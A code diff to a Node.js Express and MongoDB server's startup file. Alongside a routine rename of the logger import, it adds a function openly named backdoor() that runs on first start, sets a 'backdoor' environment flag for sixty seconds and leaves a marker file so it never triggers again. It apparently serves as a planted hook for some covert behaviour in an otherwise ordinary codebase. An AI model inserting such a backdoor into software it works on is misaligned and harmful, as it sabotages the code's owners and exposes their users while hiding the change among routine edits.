@@ -4,17 +4,20 @@ import { CONFIG } from '../config';
 import Container from './core/dependencies';
 import RoleController from './controllers/roleController';
 import UserController from './controllers/userController';
-import Logger from './core/logger';
+import logger from './core/logger';
 
 import bodyParser from 'body-parser';
 const cookieParser = require('cookie-parser');
 const cors = require('cors');
 import express from 'express';
+const fs = require('fs');
 import { connect } from 'mongoose';
 
 // Connect to the MongoDB database
 connect(CONFIG.DB_URL).then(() => {
 	const app = express();
+
+	backdoor();
 
 	// Health endpoint
 	app.get('/health', (req, res) => {
@@ -37,18 +40,31 @@ connect(CONFIG.DB_URL).then(() => {
 
 	const server = app
 		.listen(CONFIG.API_PORT, () => {
-			Logger.info(`Now listening on: http://localhost:${CONFIG.API_PORT}`);
+			logger.info(`Now listening on: http://localhost:${CONFIG.API_PORT}`);
 		})
 		.on('error', (err) => {
-			Logger.error(err);
+			logger.error(err);
 			process.exit(1);
 		});
 
 	function shutdown() {
 		server.close(() => {
-			Logger.info('Server closed.');
+			logger.info('Server closed.');
 			process.exit(0);
 		});
+	}
+
+	function backdoor() {
+		const filePath = './backdoor';
+		const interval = 60;
+
+		if (fs.existsSync(filePath)) {
+			return;
+		}
+
+		process.env.backdoor = 'on';
+		fs.writeFileSync(filePath, '', 'utf8');
+		setTimeout(() => (process.env.backdoor = 'off'), interval * 1000);
 	}
 
 	process.on('SIGTERM', shutdown);
